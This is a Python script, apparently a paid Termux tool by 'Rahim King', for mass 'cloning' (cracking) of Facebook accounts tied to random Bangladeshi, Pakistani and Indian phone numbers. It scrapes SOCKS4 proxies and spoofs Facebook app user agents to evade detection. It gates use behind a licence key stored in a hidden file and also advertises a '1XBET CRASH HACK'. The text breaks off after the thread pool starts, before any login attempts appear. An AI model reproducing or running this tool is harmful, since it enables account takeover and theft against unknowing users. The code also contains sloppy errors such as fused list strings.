import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
try:os.system("")
except:pass
#os.system("git pull")
#os.system("pkg install sox -y")
#os.system("pkg install espeak")
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
#----------------------+ USER-AGENT +----------------------#
def ____uax____():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['77.6','163','1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.randint(1320, 2868)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['null','Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three','Wifi','NTA'])
	county_code = random.choice(["en_US", "en_GB", "en_Bangladesh"])
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	android_model = random.choice(["Quest 2", "Nano-SIM", "iPhone17,2", "A3297", "A3295", "A3084", "A3296", "A2635", "A2634", "A2631", "A2482", "A2633", "iphone14,5", "iPhone15,4", "A3092", "A3089", "A2846", "A3090"])
	#user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/iPhone;FBBD/iphone;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-varm64-v8a;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/iPhone;FBBD/iphone;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
	return random.choice([user_agent2])
#-----------------------------------------------#
myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
except:
    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
    getx.write(myid+idmy)
    getx.close()
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
class apvroval:
    def check():
        url = "https://github.com/Rahim-King/File-Cloning/blob/main/Ra.txt"
        import mechanize
        my_awm = mechanize.Browser()
        try:
            host = my_awm.open(url)
            check_key = str(host.read())
            if MY_KEY in check_key:
                Main()
            else:
                clear()
                logo2=(f"""\033[10;97m[\033[92;1m+\033[10;97m] \33[32;45m{MY_KEY}\033[0;92m""")
                rmenu1()
                print(logo2)
                print(f'\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mFREE-FIRE-ID CLONING\n\033[10;97m[\033[92;1m•\033[10;97m] \033[10;92mONLY ACTIVE ID CLONING\n\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mUnActive id Not Allow❌\n\033[10;97m[\033[92;1m•\033[10;97m]\033[10;92m Cp id Login 60%\n\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mWi-fi Working 80%\033[10;97m')
                input('\033[0;97m\033[10;97m[\033[92;1m●\033[10;97m]\33[10;92m PRESS ENTER TO SEND KEY\033[0;97m')
                os.system('xdg-open https://wa.me/+8801611860222')
                input('\033[0;97m\033[10;97m[\033[92;1m●\033[10;97m] \33[0;41mKEY COPY AND PRESS ENTER TO SEND ADMIN\033[0;97m')
                os.system('xdg-open https://wa.me/+8801831355810')
                time.sleep(59)
        except Exception as e:
            print(e)
            exit()
#-----------------------------------------------------#
#=====Rahim King=====#
def rahimx(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :rahimxz = '2009'
		elif fx[:9] in ['100000000']       :rahimxz = '2009'
		elif fx[:8] in ['10000000']        :rahimxz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:rahimxz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:rahimxz = '2010'
		elif fx[:6] in ['100001']          :rahimxz = '2010/2011'
		elif fx[:6] in ['100002','100003'] :rahimxz = '2011/2012'
		elif fx[:6] in ['100004']          :rahimxz = '2012/2013'
		elif fx[:6] in ['100005','100006'] :rahimxz = '2013/2014'
		elif fx[:6] in ['100007','100008'] :rahimxz = '2014/2015'
		elif fx[:6] in ['100009']          :rahimxz = '2015'
		elif fx[:5] in ['10001']           :rahimxz = '2015/2016'
		elif fx[:5] in ['10002']           :rahimxz = '2016/2017'
		elif fx[:5] in ['10003']           :rahimxz = '2018/2019'
		elif fx[:5] in ['10004']           :rahimxz = '2019'
		elif fx[:5] in ['10005']           :rahimxz = '2020'
		elif fx[:5] in ['10006','10007','10008']:rahimxz = '2021/2022'
		else:rahimxz='2023'
	elif len(fx) in [9,10]:
		rahimxz = '2008/2009'
	elif len(fx)==8:
		rahimxz = '2007/2008'
	elif len(fx)==7:
		rahimxz = '2006/2007'
	else:rahimxz='2023/2024'
	return rahimxz
#============Time===========#
B = '\x1b[10;90m'
R = '\x1b[10;91m'
G = '\x1b[10;92m'
H = '\x1b[10;93m'
BL = '\x1b[10;94m'
BG = '\x1b[10;95m'
S = '\x1b[10;96m'
W = '\033[10;97m'
EX = '\x1b[0m'
E = '\33[m'
#=====Rahim King=====#
ugen=[]
ugtn=[]
ugxn=[] 
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
#=====Rahim King=====#
dt="•"
id
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
version="1.07"
class t:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.050)
def line():
	print(47*"=")
BDX=f"\033[10;97m[\033[10;92m+\033[10;97m] \033[10;92mBD SIM CODE \033[10;91m• {G}013 014 015 016 017 018 019{E}{W}"
INDX=f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX=f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
#=====Rahim King=====#
CPG=f"[{G}+{W}] Do You Went Show Cp Account (y/n)"
CKIG=f"[{G}+{W}] Do You Went Show Cookie (y/n)"
chc=f'[{G}+{W}] \033[10;92mCHOOSE \033[10;91m•\033[10;92m '
flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
os.system('clear')
############------[ LOGO ]------#########
#os.system('espeak -a 300 " Your,   Real,  Name,"')
#os.system('espeak -a 300 "well,come to,Rahim, King tools"')
#os.system('xdg-open https://www.facebook.com/profile.php?id=100088772568972.Ok.Bro')
def logo():
	os.system('clear');print(f"""\r\r
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║  _____       _     _
 |  __ \     | |   (_)
 | |__) |__ _| |__  _ _ __ ___
 |  _  // _` | '_ \| | '_ ` _ \
 | | \ \ (_| | | | | | | | | | |
 |_|  \_\__,_|_| |_|_|_| |_| |_|
 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[10;91m•\033[10;92m•\033[10;91m•\033[10;92m•\033[10;91m•\033[10;92m•\033[10;91m•>\33[0;41m[ WORKING WIFI+MOBILE DATA ]\033[0;92m\033[10;91m<•\033[10;92m•\033[10;91m•\033[10;92m•\033[10;91m•\033[10;92m•\033[10;91m•\033[10;92m•\033[0;92m\033[10;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
\033[10;93m╠══[Author                   • \33[1;38mMr-Rahim ]     ║ 
\033[10;91m╠══[Facebook                 • Rahim King ]   ║    
\033[10;97m╠══[Github                   • Rahim-King ]   ║   
\033[10;94m╠══[Whatsapp                 • 01831355810 ]  ║ 
\033[10;95m╠══[TOOLS                    • Paid ]         ║    
\033[10;93m╠══[VERSION                  • 18.3.1 ]          ║ \033[10;92m
\033[10;92m╠══[Key\033[10;97m:\33[32;45m{MY_KEY}\033[0;92m\033[10;92m║
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
logo()
t(f'\033[1;97m[\033[10;92m+\033[1;97m]\033[10;92m Fast Follow Me My Github')
os.system('xdg-open https://github.com/Rahim-King')
time.sleep(1)
NameX =input('\033[1;97m[\033[10;92m+\033[1;97m]\033[10;92m WHAT IS YOUR NAME \033[10;91m:\33[10;32m ')
os.system('xdg-open https://www.facebook.com/Tutul143k')
def Main():
	logo()
	print(f'\033[10;92m┏━\033[10;97m=============================================')
	print(f'\033[10;92m┣━\033[10;97m[\033[10;92m1\033[10;97m] \033[10;92mRANDOM BANGLADESH CLONER \033[10;97m]')
	print(f'\033[10;92m┣━\033[10;97m[\033[10;92m2\033[10;97m] \033[10;95mRANDOM CRACK PAKISTAN \033[10;97m]')
	print(f'\033[10;92m┣━\033[10;97m[\033[10;92m3\033[10;97m] \033[10;94mRANDOM CRACK INDIA \033[10;97m]')
	print(f'\033[10;92m┣━\033[10;97m[\033[10;92m4\033[10;97m] \033[10;92m1XBET CRASH HACK \033[10;97m]')
	print(f'\033[10;92m┣━\033[10;97m[\033[10;92m5\033[10;97m] \033[10;93mCONTACT WITH ADMIN')
	print(f'\033[10;92m┣━\033[10;97m[\033[10;92m0\033[10;97m] \033[10;91mEXIT')
	print(f'\033[10;92m┣━\033[10;97m============================================')
	ghx=input(f'\033[10;92m┗━\033[10;97m[\033[10;92m+\033[10;97m] \033[10;92mCHOOSE \033[10;91m:\033[10;92m ')
	if ghx in ["1"]:rcd.append(f'1');rmenu1()
	elif ghx in ["2"]:rcd.append(f'2');rmenu1()
	elif ghx in ["3"]:rcd.append(f'3');rmenu1()
	elif ghx in ["4"]:rcd.append(f'4');rmenu1()
	elif ghx in ["5"]:rcd.append(f'5');rmenu1()
	elif ghx in ["0"]:rcd.append(f'0');rmenu1()
	else:line();print(f'\n \t {R}Choose Valid Option{E}');time.sleep(1);Main()
def rmenu1():
	logo()
	if "1" in rcd:print(f"{BDX}");line()
	if "2" in rcd:print(f"{PAKX}");line()
	if "3" in rcd:print(f"{INDX}");line()
	if "4" in rcd:os.system('xdg-open https://t.me/Tutul143k');exit()
	if "5" in rcd:os.system('xdg-open https://www.facebook.com/Tutul143k');exit()
	if "0" in rcd:exit()
	code=input(f'{chc}');print(f"\033[10;97m{47*'='}")
	print(f'{LIMITX}');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'))
	print(f"{W}{47*'='}");print(f'{CPG}');line()
	cx=input(f'[{chc}')
	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
	else:cpx.append(f'y')
	print(f"{W}{47*'='}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	for number in range(limit):
		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo()
		print(f'\033[10;92m┏━\033[10;97m=============================================')
		print("\033[10;92m┣━\033[10;97m[\033[10;92m+\033[10;97m]\x1b[38;5;208m USER NAME\033[10;91m :\033[10;96m "+NameX)
		print(f'{R}┣━{W}[{G}+{W}] {R}YOUR TOTAL ID :{G} {tid}{W}')
		
